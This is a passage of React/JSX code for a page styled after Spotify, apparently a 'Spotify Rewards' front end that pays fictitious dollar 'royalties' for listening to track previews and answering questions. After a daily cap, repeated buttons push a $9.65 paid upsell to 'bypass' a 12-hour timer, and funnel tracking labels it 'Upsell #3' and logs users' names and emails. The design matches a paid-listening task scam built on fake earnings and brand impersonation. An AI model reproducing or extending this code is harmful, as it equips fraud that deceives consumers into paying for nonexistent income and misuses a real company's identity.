              <div className="w-8 h-8 rounded-xl bg-emerald-500/10 text-emerald-400 flex items-center justify-center">
                <Music2 className="w-4 h-4" />
              </div>
            </div>
            <div className="text-xl font-black text-white">
              {songsCompletedToday} / {dailySongLimit} Completed
            </div>
            <p className="text-xs text-gray-400 mt-1">
              Earned today: <b className="text-[#1db954] font-bold">+${todayEarned.toFixed(2)} USD</b>
            </p>
            <div className="mt-3 pt-2.5 border-t border-[#262626] flex items-center justify-between text-xs">
              <span className="text-gray-400 flex items-center gap-1.5 font-medium">
                <TrendingUp className="w-3.5 h-3.5 text-[#1db954] shrink-0" />
                <span>Tomorrow&apos;s Earnings Probability:</span>
              </span>
              <strong className="text-[#1db954] font-black">
                ~${getDailyTotalEstimate(currentDay + 1, dailySongLimit).toFixed(2)} USD
              </strong>
            </div>
          </div>
        </div>

        {/* ========================================================================= */}
        {/* MAIN EVALUATION SECTION (The Spotify Visual Identity as in Image item 8)   */}
        {/* ========================================================================= */}
        <div className="bg-[#181818] border border-[#282828] rounded-3xl p-6 sm:p-8">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-6 border-b border-[#282828] mb-6">
            <div>
              <span className="text-xs uppercase tracking-wider font-extrabold text-[#1db954] block">
                Daily Music Evaluation Module
              </span>
              <h2 className="text-xl sm:text-2xl font-black text-white mt-1">
                Evaluate Today&apos;s Featured Track
              </h2>
            </div>
            {!isEvaluating && !evaluationCompleted && (
              <button
                type="button"
                onClick={() => setIsEvaluating(true)}
                className="py-3 px-6 rounded-full bg-[#1db954] hover:bg-[#1ed760] active:scale-[0.99] text-black font-extrabold text-sm flex items-center justify-center gap-2 transition-all shadow-lg shadow-[#1db954]/25 shrink-0"
              >
                <span>Start Today&apos;s Evaluation</span>
                <ChevronRight className="w-4 h-4 stroke-[3]" />
              </button>
            )}
          </div>

          {/* Interactive Player Box matching Alyssa Grace - Bloodstream track */}
          {(isEvaluating || evaluationCompleted) && (
            <div className="max-w-lg mx-auto space-y-5">
              {/* Green Notice Badge */}
              <div className="rounded-xl bg-[#0d2215] border border-[#1db954]/40 p-3.5 text-center">
                <span className="text-xs sm:text-sm font-bold text-[#1db954] flex items-center justify-center gap-2">
                  <Volume2 className="w-4 h-4 shrink-0" />
                  <span>
                    {previewUnlocked
                      ? '✓ 1:30 Required listen time completed! Answer all 4 questions below to collect royalties.'
                      : `Press PLAY to listen to the preview (${formatTime(audioCurrentTime)} / 1:30 required) to unlock evaluation.`}
                  </span>
                </span>
              </div>

              {/* Song Card with Spotify Player Visual */}
              <div className="bg-[#242424] rounded-2xl p-4 flex items-center justify-between border border-[#333]">
                <div className="flex items-center gap-3.5">
                  <div className="relative w-16 h-16 rounded-xl overflow-hidden bg-black shrink-0 shadow-md">
                    <Image
                      src={currentTrack.cover}
                      alt={`${currentTrack.artist} - ${currentTrack.title}`}
                      fill
                      className="object-cover"
                      referrerPolicy="no-referrer"
                    />
                  </div>
                  <div>
                    <h3 className="font-bold text-white text-base sm:text-lg leading-tight">
                      {currentTrack.title}
                    </h3>
                    <div className="flex items-center gap-2 mt-1">
                      <span className="bg-[#1db954] text-black text-[9px] font-black uppercase px-1.5 py-0.5 rounded">
                        TRACK #{activeSongIndex + 1}
                      </span>
                      <span className="text-xs text-gray-300 font-medium">{currentTrack.artist}</span>
                    </div>
                  </div>
                </div>

                {/* Circular Spotify Green Play Button */}
                <button
                  type="button"
                  onClick={toggleAudio}
                  className="w-12 h-12 rounded-full bg-[#1db954] hover:bg-[#1ed760] active:scale-95 text-black flex items-center justify-center shadow-lg shadow-[#1db954]/30 transition-all shrink-0 cursor-pointer"
                >
                  {isPlayingAudio ? (
                    <Pause className="w-5 h-5 fill-black stroke-black" />
                  ) : (
                    <Play className="w-5 h-5 fill-black stroke-black ml-0.5" />
                  )}
                </button>
              </div>

              {/* Progress Bar & Real-Time Timer (90s / 1:30) */}
              <div className="space-y-1.5">
                <div className="flex items-center justify-between text-xs text-gray-400 font-medium">
                  <span>{formatTime(audioCurrentTime)}</span>
                  <span className={previewUnlocked ? 'text-[#1db954] font-bold' : 'text-amber-400'}>
                    {previewUnlocked ? '✓ 1:30 UNLOCKED' : '1:30 Required'}
                  </span>
                </div>
                <div className="w-full bg-[#242424] h-2 rounded-full overflow-hidden border border-[#333]">
                  <div
                    className="bg-[#1db954] h-full transition-all duration-300"
                    style={{ width: `${audioProgress}%` }}
                  />
                </div>
              </div>

              {/* Question 1 */}
              <div className="space-y-2 pt-2 border-t border-[#282828]">
                <label className="block text-xs sm:text-sm font-bold text-white">
                  {currentTrack.q1.question}
                </label>
                <div className="grid grid-cols-2 gap-2">
                  {currentTrack.q1.options.map((opt) => (
                    <button
                      key={opt}
                      type="button"
                      disabled={!previewUnlocked || evaluationCompleted}
                      onClick={() => setQuestion1Answer(opt)}
                      className={`py-2.5 px-3 rounded-xl text-xs font-bold transition-all border text-left ${
                        question1Answer === opt
                          ? 'bg-[#1db954] text-black border-[#1db954]'
                          : !previewUnlocked
                          ? 'bg-[#1e1e1e] text-gray-600 border-[#2a2a2a] cursor-not-allowed'
                          : 'bg-[#242424] text-gray-300 border-[#333] hover:border-gray-500 hover:text-white cursor-pointer'
                      }`}
                    >
                      {opt}
                    </button>
                  ))}
                </div>
              </div>

              {/* Question 2 */}
              <div className="space-y-2 pt-2 border-t border-[#282828]">
                <label className="block text-xs sm:text-sm font-bold text-white">
                  {currentTrack.q2.question}
                </label>
                <div className="grid grid-cols-2 gap-2">
                  {currentTrack.q2.options.map((opt) => (
                    <button
                      key={opt}
                      type="button"
                      disabled={!previewUnlocked || evaluationCompleted}
                      onClick={() => setQuestion2Answer(opt)}
                      className={`py-2.5 px-3 rounded-xl text-xs font-bold transition-all border text-left ${
                        question2Answer === opt
                          ? 'bg-[#1db954] text-black border-[#1db954]'
                          : !previewUnlocked
                          ? 'bg-[#1e1e1e] text-gray-600 border-[#2a2a2a] cursor-not-allowed'
                          : 'bg-[#242424] text-gray-300 border-[#333] hover:border-gray-500 hover:text-white cursor-pointer'
                      }`}
                    >
                      {opt}
                    </button>
                  ))}
                </div>
              </div>

              {/* Question 3 */}
              <div className="space-y-2 pt-2 border-t border-[#282828]">
                <label className="block text-xs sm:text-sm font-bold text-white">
                  {currentTrack.q3.question}
                </label>
                <div className="grid grid-cols-3 gap-2">
                  {currentTrack.q3.options.map((opt) => (
                    <button
                      key={opt}
                      type="button"
                      disabled={!previewUnlocked || evaluationCompleted}
                      onClick={() => setQuestion3Answer(opt)}
                      className={`py-2.5 px-3 rounded-xl text-xs font-bold transition-all border text-center ${
                        question3Answer === opt
                          ? 'bg-[#1db954] text-black border-[#1db954]'
                          : !previewUnlocked
                          ? 'bg-[#1e1e1e] text-gray-600 border-[#2a2a2a] cursor-not-allowed'
                          : 'bg-[#242424] text-gray-300 border-[#333] hover:border-gray-500 hover:text-white cursor-pointer'
                      }`}
                    >
                      {opt}
                    </button>
                  ))}
                </div>
              </div>

              {/* Question 4 */}
              <div className="space-y-2 pt-2 border-t border-[#282828]">
                <label className="block text-xs sm:text-sm font-bold text-white">
                  {currentTrack.q4.question}
                </label>
                <div className="grid grid-cols-1 sm:grid-cols-3 gap-2">
                  {currentTrack.q4.options.map((opt) => (
                    <button
                      key={opt}
                      type="button"
                      disabled={!previewUnlocked || evaluationCompleted}
                      onClick={() => setQuestion4Answer(opt)}
                      className={`py-2.5 px-3 rounded-xl text-xs font-bold transition-all border text-center ${
                        question4Answer === opt
                          ? 'bg-[#1db954] text-black border-[#1db954]'
                          : !previewUnlocked
                          ? 'bg-[#1e1e1e] text-gray-600 border-[#2a2a2a] cursor-not-allowed'
                          : 'bg-[#242424] text-gray-300 border-[#333] hover:border-gray-500 hover:text-white cursor-pointer'
                      }`}
                    >
                      {opt}
                    </button>
                  ))}
                </div>
              </div>

              {/* Finish & Earn Button */}
              {!evaluationCompleted ? (
                <button
                  type="button"
                  disabled={
                    !previewUnlocked ||
                    !question1Answer ||
                    !question2Answer ||
                    !question3Answer ||
                    !question4Answer
                  }
                  onClick={handleCompleteEvaluation}
                  className={`w-full py-4 px-6 rounded-full font-black text-sm uppercase tracking-wider transition-all mt-4 ${
                    previewUnlocked &&
                    question1Answer &&
                    question2Answer &&
                    question3Answer &&
                    question4Answer
                      ? 'bg-[#1db954] text-black hover:bg-[#1ed760] active:scale-[0.99] shadow-xl shadow-[#1db954]/25 cursor-pointer'
                      : 'bg-[#242424] text-gray-500 border border-[#333] cursor-not-allowed'
                  }`}
                >
                  {!previewUnlocked
                    ? 'LISTEN TO 1:30 TO UNLOCK EVALUATION'
                    : !question1Answer || !question2Answer || !question3Answer || !question4Answer
                    ? 'ANSWER ALL 4 QUESTIONS TO CLAIM'
                    : `FINISH & EARN (+$${getProgressiveSongReward(currentDay, songsCompletedToday).toFixed(2)} USD)`}
                </button>
              ) : (
                <div className="p-5 rounded-2xl bg-[#0d2215] border border-[#1db954] text-center space-y-3 mt-4 animate-in zoom-in-95">
                  <div className="w-10 h-10 mx-auto rounded-full bg-[#1db954] text-black flex items-center justify-center font-bold">
                    <CheckCircle2 className="w-6 h-6 stroke-[2.5]" />
                  </div>
                  <h4 className="text-white font-extrabold text-base">
                    Evaluation Royalties Credited!
                  </h4>
                  <p className="text-xs text-gray-300">
                    <b className="text-[#1db954] font-black">+${evaluationReward.toFixed(2)} USD</b> has been added to your balance. (Completed {songsCompletedToday}/{dailySongLimit} tasks today).
                  </p>
                  <div className="py-2 px-3 rounded-xl bg-black/40 border border-[#1db954]/25 flex items-center justify-between text-xs">
                    <span className="text-gray-300 font-semibold flex items-center gap-1.5">
                      <TrendingUp className="w-3.5 h-3.5 text-[#1db954]" />
                      <span>Tomorrow&apos;s Earnings Probability:</span>
                    </span>
                    <span className="text-[#1db954] font-black">
                      ~${getDailyTotalEstimate(currentDay + 1, dailySongLimit).toFixed(2)} USD
                    </span>
                  </div>

                  {songsCompletedToday < dailySongLimit ? (
                    <button
                      type="button"
                      onClick={() => {
                        if (audioRef.current) {
                          audioRef.current.pause();
                          audioRef.current.currentTime = 0;
                        }
                        setIsPlayingAudio(false);
                        maxPlayedTimeRef.current = 0;
                        const nextIdx = activeSongIndex + 1;
                        setEvaluationCompleted(false);
                        setPreviewUnlocked(false);
                        setAudioCurrentTime(0);
                        setAudioProgress(0);
                        setQuestion1Answer(null);
                        setQuestion2Answer(null);
                        setQuestion3Answer(null);
                        setQuestion4Answer(null);
                        setActiveSongIndex(nextIdx);
                        setEvaluationReward(getProgressiveSongReward(currentDay, songsCompletedToday));
                        if (typeof window !== 'undefined') {
                          localStorage.setItem('spotify_active_song_index_' + listenerEmail.toLowerCase(), nextIdx.toString());
                        }
                      }}
                      className="w-full py-3 px-4 rounded-full bg-[#1db954] hover:bg-[#1ed760] text-black font-black text-xs uppercase tracking-wider cursor-pointer shadow-md transition-all flex items-center justify-center gap-2"
                    >
                      <span>EVALUATE NEXT TRACK</span>
                      <ChevronRight className="w-4 h-4 stroke-[3]" />
                    </button>
                  ) : (
                    <div className="pt-2 border-t border-[#1db954]/30 space-y-2">
                      <div className="flex items-center justify-center gap-2 text-amber-400 text-xs font-extrabold">
                        <Clock className="w-4 h-4" />
                        <span>Daily Queue Limit Reached ({dailySongLimit}/{dailySongLimit})</span>
                      </div>
                      <button
                        type="button"
                        onClick={() => {
                          setShowSkipCooldownModal(true);
                          recordFunnelEvent({
                            email: listenerEmail,
                            full_name: listenerName,
                            offer_id: 'upsell_skip12h_9_65',
                            offer_name: 'Upsell #3: Destravar Timer 12h',
                            amount: 9.65,
                            action: 'viewed',
                          }).catch(() => {});
                        }}
                        className="w-full py-3 px-4 rounded-full bg-amber-400 hover:bg-amber-300 text-black font-black text-xs uppercase tracking-wider cursor-pointer shadow-md transition-all flex items-center justify-center gap-2"
                      >
                        <span>BYPASS 12-HOUR TIMER NOW (+$9.65 USD)</span>
                        <Sparkles className="w-4 h-4" />
                      </button>
                    </div>
                  )}
                </div>
              )}
            </div>
          )}

          {!isEvaluating && !evaluationCompleted && (
            <div>
              {songsCompletedToday >= dailySongLimit ? (
                /* 12-HOUR COOLDOWN CARD */
                <div className="text-center py-8 space-y-4">
                  <div className="w-16 h-16 mx-auto rounded-2xl bg-amber-500/10 text-amber-400 border border-amber-500/30 flex items-center justify-center">
                    <Clock className="w-8 h-8 animate-pulse" />
                  </div>
                  <div>
                    <span className="text-[10px] font-black text-amber-400 uppercase tracking-widest block">
                      Daily Queue Limit Active ({songsCompletedToday}/{dailySongLimit})
                    </span>
                    <h3 className="text-xl font-black text-white mt-0.5">
                      Next Track Queue Unlocks In:
                    </h3>
                    <div className="text-3xl font-black text-amber-400 font-mono tracking-wider mt-1">
                      {formatCountdown(cooldownSecondsLeft)}
                    </div>
                  </div>

                  {/* Tomorrow's Earnings Probability Highlight Box */}
                  <div className="max-w-sm mx-auto p-3.5 rounded-2xl bg-[#0d2215] border border-[#1db954]/40 flex items-center justify-between text-xs">
                    <span className="text-gray-200 font-bold flex items-center gap-1.5">
                      <TrendingUp className="w-4 h-4 text-[#1db954] shrink-0" />
                      <span>Tomorrow&apos;s Earnings Probability:</span>
                    </span>
                    <strong className="text-[#1db954] font-black text-sm">
                      ~${getDailyTotalEstimate(currentDay + 1, dailySongLimit).toFixed(2)} USD
                    </strong>
                  </div>

                  <p className="text-xs text-gray-400 max-w-sm mx-auto leading-relaxed">
                    You have finished your assigned daily music tasks. Return in 12 hours or skip the wait to unlock tomorrow&apos;s <b className="text-white">~${getDailyTotalEstimate(currentDay + 1, dailySongLimit).toFixed(2)} USD</b> payout pool now.
                  </p>
                  <button
                    type="button"
                    onClick={() => {
                      setShowSkipCooldownModal(true);
                      recordFunnelEvent({
                        email: listenerEmail,
                        full_name: listenerName,
                        offer_id: 'upsell_skip12h_9_65',
                        offer_name: 'Upsell #3: Destravar Timer 12h',
                        amount: 9.65,
                        action: 'viewed',
                      }).catch(() => {});
                    }}
                    className="py-3.5 px-8 rounded-full bg-amber-400 hover:bg-amber-300 text-black font-black text-xs uppercase tracking-wider transition-all shadow-lg shadow-amber-400/20 cursor-pointer flex items-center justify-center gap-2 mx-auto"
                  >
                    <Sparkles className="w-4 h-4" />
                    <span>BYPASS 12-HOUR TIMER NOW (+$9.65 USD)</span>
                  </button>
                </div>
              ) : (
                <div className="text-center py-8">
                  <div className="w-16 h-16 mx-auto rounded-2xl bg-[#242424] text-[#1db954] flex items-center justify-center mb-4">
                    <Music2 className="w-8 h-8" />
                  </div>
                  <h3 className="text-lg font-bold text-white">Daily Queue Ready</h3>
                  <p className="text-xs text-gray-400 max-w-sm mx-auto mt-1 mb-5">
                    New promotional tracks are assigned daily ({songsCompletedToday}/{dailySongLimit} evaluated today). Listen to 1:30 previews and collect royalties.
                  </p>
                  <button
                    type="button"
                    onClick={() => setIsEvaluating(true)}
                    className="py-3 px-8 rounded-full bg-[#1db954] hover:bg-[#1ed760] text-black font-extrabold text-sm transition-all shadow-lg shadow-[#1db954]/25 cursor-pointer"
                  >
                    Start Evaluation Now
                  </button>
                </div>
              )}
            </div>
          )}
        </div>

      </main>

      {/* Footer */}
      <footer className="border-t border-[#222] py-8 px-4 text-center text-xs text-gray-500 space-y-2 mt-12">
        <p>&copy; {new Date().getFullYear()} Spotify Rewards Partner Network. All rights reserved.</p>
        <div className="flex items-center justify-center gap-4 text-gray-500">
          <Link href="/politicasdeprivacidade" className="hover:text-gray-300">
            Privacy Policy
          </Link>
          <span>&bull;</span>
          <Link href="/suporte" className="hover:text-gray-300">
            Support Portal
          </Link>
        </div>
      </footer>
    </div>
  );
}
